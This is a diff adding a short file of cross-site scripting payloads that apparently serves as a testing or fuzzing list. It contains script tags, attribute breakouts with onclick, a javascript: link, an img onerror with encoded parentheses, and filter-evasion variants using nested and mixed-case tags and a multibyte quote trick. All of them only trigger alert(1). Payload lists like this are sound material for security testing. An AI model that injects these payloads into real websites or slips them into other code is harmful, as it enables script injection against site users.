@@ -1,0 +1,5 @@
+<script>alert(1)</script>
+aaa' onclick='alert(1) || aaa'></a><a href='javascript:alert(1);
+<sscriptcript>alert(1)</scrscriptipt> || <ScrIpt>alert(1)</scRIpT>
+<img src="" onerror="alert&#x28;1&#x29;"/> 
+%bf' onclick=alert(1)>aa</a><!--
